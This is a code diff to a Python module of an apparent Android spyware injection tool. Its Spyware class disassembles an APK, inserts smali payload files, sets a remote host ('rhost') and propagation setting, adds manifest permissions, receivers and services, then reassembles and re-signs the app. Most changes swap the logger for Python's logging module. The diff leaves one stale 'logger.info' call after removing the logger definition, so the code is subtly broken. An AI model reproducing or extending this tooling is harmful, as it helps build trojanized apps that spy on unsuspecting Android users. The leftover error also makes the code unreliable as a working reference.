@@ -13,6 +13,7 @@
 #    limitations under the License.
 
 import os
+import logging
 import shutil
 import subprocess
 import sys
@@ -22,10 +23,7 @@ import zipfile
 from metadata import metadata
 from payloads.payload import Payload
 from reverse_engineer import reverse_engineer
-from utils import config, logger, register
-
-logger = logger.get_logger()
-
+from utils import config, register_operation
 
 class Spyware(Payload):
     def __init__(self, args):
@@ -34,12 +32,13 @@ class Spyware(Payload):
         self.propagate = self.args.propagate
 
     def run(self):
-        logger.info("disassembling...")
-        logger.warning("this operation might take some time")
+        logging.info("disassembling...")
+        logging.warning("this operation might take some time")
         reverse_engineer.disassemble(self)
 
-        logger.info("exporting payload...")
+        logging.info("export the smali payload files into the app...")
         payload_path = self.export_payload()
+        logging.info("populate the payload rhost and propagate values")
         self.set_payload_settings(payload_path)
 
         logger.info("injecting...")
@@ -51,11 +50,11 @@ class Spyware(Payload):
             file_metadata = metadata.generate_file_metadata(self.destination)
             self.inject(self.destination, file_metadata)
 
-        logger.info("reassembling...")
-        logger.warning("this operation might take some time")
+        logging.info("reassembling...")
+        logging.warning("this operation might take some time")
         reverse_engineer.reassemble(self)
 
-        logger.info("signing...")
+        logging.info("signing...")
         reverse_engineer.sign(self)
 
     def inject(self, file_path, file_metadata):
@@ -79,7 +78,7 @@ class Spyware(Payload):
                     words = line.split()
                     # Retrieving the method information from the meta-data
                     data = metadata.get_data(words[-1], file_metadata)
-                    valid_regs = register.get_valid_regs(data[3], data[2])
+                    valid_regs = register_operation.get_valid_regs(data[3], data[2])
                     # The method must have at least one free register, less
                     # than sixteen register, must not
                     # contain any monitor directive and not be alredy edited
@@ -153,19 +152,23 @@ class Spyware(Payload):
         the AndroidManifest.
         """
         try:
+            logging.info("disassemble the app ressources")
             instruction = (
                 "java -jar ../libs/apktool_2.2.4.jar decode --force "
                 "--no-src {} -o {}".format(
                     self.app_path,
                     os.path.join(config.TMP_FOLDER, self.app_name + "_res"))
             )
+            logging.debug("{}".format(instruction))
             subprocess.check_output(instruction, shell=True)
 
+            logging.info("add permissions, receivers and services to the 'AndroidManifest.xml'")
             self.add_AndroidManifest_permissions(
                 os.path.join(
                     config.TMP_FOLDER, self.app_name + "_res",
                     "AndroidManifest.xml"))
 
+            logging.info("disassemble the app")
             instruction = (
                 "java -jar ../libs/apktool_2.2.4.jar build --force "
                 "{} -o {}".format(
@@ -174,8 +177,10 @@ class Spyware(Payload):
                     os.path.join(
                         config.TMP_FOLDER, self.app_name + "-apktool.apk"))
             )
+            logging.debug("{}".format(instruction))
             subprocess.check_output(instruction, shell=True)
 
+            logging.info("extract the newly assembled 'AndroidManifest.xml'")
             with zipfile.ZipFile(os.path.join(
                  config.TMP_FOLDER, self.app_name + "-apktool.apk"),
                  'r') as zip_file:
@@ -184,6 +189,7 @@ class Spyware(Payload):
                     os.path.join(config.TMP_FOLDER))
 
             # Remove the "_res" folder and the apktool built app
+            logging.info("remove the apktool disassembled folder and reassembled app from the 'tmp' folder")
             shutil.rmtree(os.path.join(
                 config.TMP_FOLDER, self.app_name + "_res"), ignore_errors=True)
             os.remove(os.path.join(
@@ -193,7 +199,7 @@ class Spyware(Payload):
             return os.path.join(config.TMP_FOLDER, "AndroidManifest.xml")
 
         except subprocess.CalledProcessError as ex:
-            print("{} - {}".format(ex.returncode, ex.output.decode()))
+            logging.critical("{} - {}".format(ex.returncode, ex.output.decode()))
             sys.exit(1)
 
     def set_payload_settings(self, payload_path):
